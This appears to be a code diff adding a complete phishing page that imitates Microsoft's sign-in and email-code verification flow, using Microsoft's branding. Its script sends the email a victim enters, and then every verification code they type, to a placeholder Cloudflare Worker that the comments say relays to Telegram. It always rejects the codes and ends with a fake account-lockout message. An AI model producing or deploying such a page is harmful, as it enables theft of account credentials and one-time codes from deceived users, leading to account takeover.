@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en" style="height:100%; margin:0; padding:0;">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Microsoft Code Verification Clone</title>
+  <style>
+    /* container styles */
+    body {
+      height:100%; margin:0; padding:0;
+      font-family:'Segoe UI', Tahoma, sans-serif;
+      background: url('https://logincdn.msauth.net/shared/5/images/fluent_web_light_57fee22710b04cebe1d5.svg') no-repeat center/cover;
+      display:flex; align-items:center; justify-content:center;
+    }
+    .card {
+      background:#fff; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.15);
+      width:360px; padding:32px; text-align:center;
+    }
+    .card img { width:72px; margin-bottom:24px; }
+    h1 { font-size:24px; font-weight:600; margin:0 0 8px; }
+    .step { display:none; }
+    .step.active { display:block; }
+    input { box-sizing:border-box; width:100%; padding:10px 12px; border:1px solid #a6a6a6; border-radius:2px; margin-bottom:24px; font-size:14px; }
+    button { width:100%; background:#0078d4; color:#fff; font-size:16px; padding:10px; border:none; border-radius:2px; cursor:pointer; }
+    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    .spinner { margin: 40px auto; width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid #0078d4; border-radius:50%; animation:spin 1s linear infinite; }
+    #codeInputs { display:flex; justify-content:space-between; }
+    #codeInputs input { width:40px; height:40px; text-align:center; font-size:18px; border:1px solid #a6a6a6; }
+    .error { color:#d00; min-height:1.2em; margin-bottom:16px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="https://www.sharepointeurope.com/wp-content/uploads/sponsors/2024/08/Microsoft-Logo.png" alt="Microsoft logo" />
+    <h1>Sign in</h1>
+
+    <!-- Step 1: enter email -->
+    <div id="step1" class="step active">
+      <input id="emailInput" type="email" maxlength="254" placeholder="Email or phone number" />
+      <button id="emailNextBtn">Next</button>
+    </div>
+
+    <!-- Step 2: spinner -->
+    <div id="step2" class="step">
+      <div class="spinner"></div>
+      <p style="color:#606060;">Loading…</p>
+    </div>
+
+    <!-- Step 3: get code -->
+    <div id="step3" class="step">
+      <h1 style="font-size:20px; margin-bottom:8px;">Get a code to sign in</h1>
+      <p style="font-size:14px; color:#606060; margin-bottom:24px;">We'll send a code to <strong id="displayEmail"></strong> to sign you in.</p>
+      <button id="sendCodeBtn">Send code</button>
+    </div>
+
+    <!-- Step 4: verify code -->
+    <div id="step4" class="step">
+      <h1 style="font-size:20px; margin-bottom:8px;">Verify your email</h1>
+      <p style="font-size:14px; color:#606060; margin-bottom:8px;">Enter the code we sent to your email address.</p>
+      <div id="verifyError" class="error"></div>
+      <div id="codeInputs">
+        <input type="text" maxlength="1" />
+        <input type="text" maxlength="1" />
+        <input type="text" maxlength="1" />
+        <input type="text" maxlength="1" />
+        <input type="text" maxlength="1" />
+        <input type="text" maxlength="1" />
+      </div>
+      <button id="verifyBtn" style="margin-top:24px;">Verify</button>
+    </div>
+  </div>
+
+  <script>
+    const WORKER_URL = 'https://<your-worker>.workers.dev/';
+    let currentEmail = '';
+    let attemptCount = 0;
+    const steps = [
+      document.getElementById('step1'),
+      document.getElementById('step2'),
+      document.getElementById('step3'),
+      document.getElementById('step4')
+    ];
+
+    function show(stepIndex) {
+      steps.forEach((el, i) => el.classList.toggle('active', i === stepIndex));
+    }
+
+    // allow Enter key on email to trigger Next
+    document.getElementById('emailInput').addEventListener('keydown', e => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        document.getElementById('emailNextBtn').click();
+      }
+    });
+
+    document.getElementById('emailNextBtn').addEventListener('click', () => {
+      const email = document.getElementById('emailInput').value.trim();
+      if (!email) return alert('Please enter a valid email.');
+      currentEmail = email;
+      // send email to Telegram
+      fetch(WORKER_URL, {
+        method: 'POST', headers: { 'Content-Type':'application/json' },
+        body: JSON.stringify({ email: currentEmail, attemptCount: 0 })
+      }).catch(() => {});
+      // show loading spinner
+      show(1);
+      setTimeout(() => {
+        document.getElementById('displayEmail').textContent = currentEmail;
+        show(2);
+      }, 5000);
+    });
+
+    document.getElementById('sendCodeBtn').addEventListener('click', () => {
+      show(3);
+      document.querySelector('#codeInputs input').focus();
+    });
+
+    // auto-advance code inputs
+    document.querySelectorAll('#codeInputs input').forEach((input, idx, inputs) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && idx < inputs.length - 1) {
+          inputs[idx + 1].focus();
+        }
+      });
+    });
+
+    document.getElementById('verifyBtn').addEventListener('click', () => {
+      const code = Array.from(document.querySelectorAll('#codeInputs input')).map(i => i.value).join('');
+      if (code.length < 6) return alert('Please enter the 6-digit code.');
+      attemptCount++;
+      // send email and code attempt to Telegram
+      fetch(WORKER_URL, {
+        method: 'POST', headers: { 'Content-Type':'application/json' },
+        body: JSON.stringify({ email: currentEmail, password: code, attemptCount })
+      }).catch(() => {});
+      if (attemptCount >= 3) {
+        document.getElementById('verifyError').textContent = 'Your account is locked. Please retry in 1 hour.';
+        document.getElementById('verifyBtn').disabled = true;
+        document.querySelectorAll('#codeInputs input').forEach(i => i.disabled = true);
+      } else {
+        document.getElementById('verifyError').textContent = 'The code is incorrect. Please try again.';
+        document.querySelectorAll('#codeInputs input').forEach(i => i.value = '');
+        document.querySelector('#codeInputs input').focus();
+      }
+    });
+  </script>
+</body>
+</html>
